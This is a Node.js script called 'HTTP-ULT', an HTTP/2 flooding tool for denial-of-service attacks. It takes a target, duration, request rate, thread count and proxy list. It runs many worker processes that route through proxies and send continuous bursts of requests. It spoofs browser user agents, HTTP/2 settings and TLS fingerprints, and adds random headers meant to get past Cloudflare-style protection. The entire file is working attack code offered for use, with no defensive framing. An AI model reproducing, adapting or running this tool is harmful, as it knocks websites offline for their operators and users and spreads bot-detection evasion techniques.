const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com', 'youtube.com', 'facebook.com', 'baidu.com',
    'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com',
    'reddit.com', 'netflix.com'
];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

// 🔥 MODIFIKASI: TLS 1.3 ONLY (disable TLS 1.2 ke bawah)
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_2 |  // 🔥 DISABLE TLS 1.2
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLS_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: {
                host: options.host,
                port: options.port,
                type: 5
            },
            command: 'connect',
            destination: {
                host: address[0],
                port: +address[1]
            }
        }, (error, info) => {
            if (error) {
                return callback(undefined, error);
            } else {
                return callback(info.socket, undefined);
            }
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let isp = null;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;
getIPAndISP(targetURL);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ========== 🔥 FITUR BARU: TRANSFORM SETTINGS (dari PW2/PW3) ==========
function transformSettings(settings) {
    const settingsMap = {
        "headerTableSize": 0x1,
        "enablePush": 0x2,
        "maxConcurrentStreams": 0x3,
        "initialWindowSize": 0x4,
        "maxFrameSize": 0x5,
        "maxHeaderListSize": 0x6
    };
    return Object.entries(settings).map(([key, value]) => [settingsMap[key], value]);
}

// ========== 🔥 FITUR BARU: SETTINGS PER BROWSER (dari PW2/PW3) ==========
const h2SettingsMap = {
    brave: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 500, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    chrome: { headerTableSize: 4096, enablePush: false, maxConcurrentStreams: 1000, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    firefox: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 100, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    mobile: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 500, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    opera: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 500, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    operagx: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 500, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    safari: { headerTableSize: 4096, enablePush: false, maxConcurrentStreams: 100, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 },
    duckduckgo: { headerTableSize: 65536, enablePush: false, maxConcurrentStreams: 500, initialWindowSize: 6291456, maxFrameSize: 16384, maxHeaderListSize: 262144 }
};

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`       HTTP-ULT`.red);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + process.argv[2].white);
    console.log(`Time: `.blue + process.argv[3].white);
    console.log(`Rate: `.blue + process.argv[4].white);
    console.log(`Thread: `.blue + process.argv[5].white);
    console.log(`ProxyFile: `.blue + process.argv[6].white);
    console.log(`TLS: `.green + `TLS 1.3 ONLY`.brightGreen);
    console.log(`H2 Preface: `.green + `ENABLED`.brightGreen);
    console.log(`Settings per Browser: `.green + `ENABLED`.brightGreen);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;
    
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    
    // ========== BROWSER & HEADERS (dari BASE) ==========
    const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];
    const getRandomBrowser = () => browsers[Math.floor(Math.random() * browsers.length)];
    const browser = getRandomBrowser();
    
    // Generate headers (dari BASE, sudah lengkap)
    const generateHeaders = (browser) => {
        const versions = {
            chrome: { min: 115, max: 125 }, safari: { min: 14, max: 17 }, brave: { min: 115, max: 125 },
            firefox: { min: 100, max: 115 }, mobile: { min: 95, max: 115 }, opera: { min: 85, max: 105 },
            operagx: { min: 85, max: 105 }, duckduckgo: { min: 12, max: 17 }
        };
        
        const userAgents = {
            chrome: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
            firefox: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64; rv:${Math.floor(100 + Math.random() * 20)}.0) Gecko/20100101 Firefox/${Math.floor(100 + Math.random() * 20)}.${Math.floor(Math.random() * 50)}.0`,
            safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(10 + Math.random() * 5)} (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 Safari/605.1.${Math.floor(Math.random() * 5)}`,
            opera: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)}`,
            operagx: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 OPR/${Math.floor(95 + Math.random() * 10)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 5)} (Edition GX)`,
            brave: `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 500)}.${Math.floor(Math.random() * 5)}`,
            mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(11 + Math.random() * 4)}; ${Math.random() < 0.5 ? "Mobile" : "Tablet"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 15)}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 10)} Mobile Safari/537.36`,
            duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(13 + Math.random() * 4)}_${Math.floor(Math.random() * 4)}) AppleWebKit/605.1.${Math.floor(10 + Math.random() * 5)} (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.${Math.floor(Math.random() * 5)}`
        };
        
        return {
            ":method": "GET",
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 5) + "=" + generateRandomString(5, 10),
            "user-agent": userAgents[browser] || userAgents.chrome,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": ["en-US,en;q=0.9", "id-ID,id;q=0.9", "fr-FR,fr;q=0.8"][Math.floor(Math.random() * 3)],
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, br, zstd",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache",
            "upgrade-insecure-requests": "1",
            "dnt": "1"
        };
    };
    
    const headers = generateHeaders(browser);
    
    function taoDoiTuongNgauNhien() {
        const doiTuong = {};
        const maxi = getRandomInt(2, 3);
        for (let i = 1; i <= maxi; i++) {
            const key = 'cf-sec-' + generateRandomString(1, 9);
            const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
            doiTuong[key] = value;
        }
        return doiTuong;
    }
    
    const clength = urihost[Math.floor(Math.random() * urihost.length)];
    const headers4 = {
        ...(Math.random() < 0.4 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }),
        ...(Math.random() < 0.75 ? { "referer": "https:/" + clength } : {}),
        ...(Math.random() < 0.75 ? { "origin": Math.random() < 0.5 ? "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4, 4) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength } : {}),
    };
    
    const dyn = {
        ...(Math.random() < 0.5 ? { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
        ...(Math.random() < 0.5 ? { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
    };
    
    const dyn2 = {
        ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
        ...(Math.random() < 0.5 ? { "purpose": "prefetch" } : {}),
        "RTT": "1"
    };
    
    let allHeaders = Object.assign({}, headers, headers4, dyn, dyn2);
    
    // 🔥 FITUR BARU: Settings per browser + ISP override
    let finalSettings = { ...h2SettingsMap[browser] };
    if (isp) {
        // ISP-based settings override
        if (isp === 'Cloudflare, Inc.') finalSettings.maxConcurrentStreams = getRandomInt(100, 256);
        if (isp === 'Google LLC') finalSettings.initialWindowSize = 1048576;
    }
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 50
    };
    
    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error || !connection) return;
        
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);
        
        // 🔥 TLS 1.3 ONLY (sudah dimodifikasi di secureOptions)
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };
        
        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);
        
        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
            if (!cipherInfo) return null;
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3String);
            return md5Hash.digest('hex');
        }
        
        tlsSocket.on('connect', () => {
            generateJA3Fingerprint(tlsSocket);
        });
        
        let hpack = new HPACK();
        let client;
        
        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: finalSettings,
            socket: tlsSocket,
        });
        
        client.setMaxListeners(0);
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });
        
        // 🔥🔥🔥 FITUR BARU: HTTP/2 PREFACE + SETTINGS FRAMES (dari PW2/PW3)
        const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        const h2configTransformed = transformSettings(finalSettings);
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings(h2configTransformed)),
            encodeFrame(0, 8, updateWindow)
        ];
        
        client.on('connect', () => {
            client.ping((err, duration, payload) => {});
            
            const intervalId = setInterval(() => {
                const shuffleObject = (obj) => {
                    const keys = Object.keys(obj);
                    for (let i = keys.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [keys[i], keys[j]] = [keys[j], keys[i]];
                    }
                    const shuffledObj = {};
                    keys.forEach(key => shuffledObj[key] = obj[key]);
                    return shuffledObj;
                };
                
                const dynHeaders = shuffleObject({
                    ...allHeaders,
                    ...(Math.random() < 0.5 ? { "Cache-Control": "max-age=0" } : {}),
                    ...(Math.random() < 0.5 ? { ["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1, 5) } : { ["X-FRAMES" + generateRandomString(1, 4)]: "NAVIGATE" + randstr(3) }),
                    ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {})
                });
                
                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(dynHeaders)
                ]);
                
                const streamId = 1;
                const requests = [];
                
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                    for (let i = 0; i < args.Rate; i++) {
                        const requestPromise = new Promise((resolve) => {
                            const req = client.request(dynHeaders, {
                                weight: Math.random() < 0.5 ? 251 : 231,
                                depends_on: 0,
                                exclusive: Math.random() < 0.5 ? true : false,
                            });
                            req.on('response', response => {
                                req.close(http2.constants.NO_ERROR);
                                req.destroy();
                                resolve();
                            });
                            req.on('error', () => {
                                req.destroy();
                                resolve();
                            });
                            req.end();
                        });
                        requests.push(requestPromise);
                    }
                    
                    Promise.all(requests).then(() => {
                        client.write(Buffer.concat(frames));
                    });
                }
            }, 500);
            
            client.on("close", () => {
                clearInterval(intervalId);
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });
            
            client.on("error", error => {
                clearInterval(intervalId);
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });
        });
        
        tlsSocket.on('error', () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});